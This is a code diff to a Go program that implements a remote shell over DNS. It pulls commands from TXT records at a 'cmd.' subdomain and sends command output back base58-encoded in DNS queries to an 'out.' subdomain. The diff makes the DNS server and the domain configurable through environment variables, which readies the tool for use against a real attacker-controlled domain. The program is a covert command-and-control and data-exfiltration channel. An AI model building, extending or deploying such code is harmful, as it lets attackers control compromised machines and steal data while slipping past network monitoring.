@@ -16,15 +16,18 @@ import (
 
 	"github.com/btcsuite/btcutil/base58"
 )
-
 func main() {
-	host := os.Getenv("DNSHOST")
+	host := os.Getenv("DNS_SERVER")
 	if host == ""{
 		host = "127.0.0.1:53"
 	}
+	dnsDomain := os.Getenv("DNS_DOMAIN")
+	if dnsDomain == ""{
+		dnsDomain = "example.com"
+	}
 	fmt.Printf("Connecting to %s\n", host)
 
-	// Create dns resolver
+	// Create dns resolver cannot be used on Windows
 	r := &net.Resolver{
 		PreferGo: true,
 		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
@@ -35,7 +38,7 @@ func main() {
 		},
 	}
 	shell := Shell{}
-	shell.Init()
+	shell.Init(dnsDomain)
 
 	go shell.FetchStdin(r)
 	shell.Execute()
@@ -47,6 +50,9 @@ type Shell struct {
 	stdOut chan []byte
 	stdIn  chan string
 
+	domainCmd string
+	domainOut string
+
 	cmdStdoutReader *io.PipeReader
 	cmdStdoutWriter *io.PipeWriter
 
@@ -54,18 +60,21 @@ type Shell struct {
 	cmdStdinWriter  *io.PipeWriter
 }
 
-func (s *Shell) Init() {
+func (s *Shell) Init(domain string) {
 	s.stdIn = make(chan string)
 	s.stdOut = make(chan []byte)
 	s.cmdStdoutReader, s.cmdStdoutWriter = io.Pipe()
 	s.cmdStdinReader, s.cmdStdinWriter = io.Pipe()
+
+	s.domainCmd = "cmd." + domain
+	s.domainOut = "out." + domain
 }
 
 //Contact the server and get stdin
 func (s *Shell) FetchStdin(r *net.Resolver) {
 	for {
 		//get shell command using dns TXT record
-		data, err := r.LookupTXT(context.Background(), "cmd.example.com")
+		data, err := r.LookupTXT(context.Background(), s.domainCmd)
 		if err != nil {
 			log.Fatal(err)
 			return
@@ -154,7 +163,7 @@ func (s *Shell) encodeRequests(cmdOutput []byte) []string {
 		if nLevels%3 == 0 && len(levelBytes) == 0 {
 			if nLevels != 0 {
 				//we need to create a new request
-				builder.WriteString("out.example.com")
+				builder.WriteString(s.domainOut)
 				requests = append(requests, builder.String())
 				builder.Reset()
 			}
@@ -188,7 +197,7 @@ func (s *Shell) encodeRequests(cmdOutput []byte) []string {
 		builder.WriteString(base58.Encode(levelBytes))
 		builder.WriteString(".")
 	}
-	builder.WriteString("out.example.com")
+	builder.WriteString(s.domainOut)
 	requests = append(requests, builder.String())
 	return requests
 }
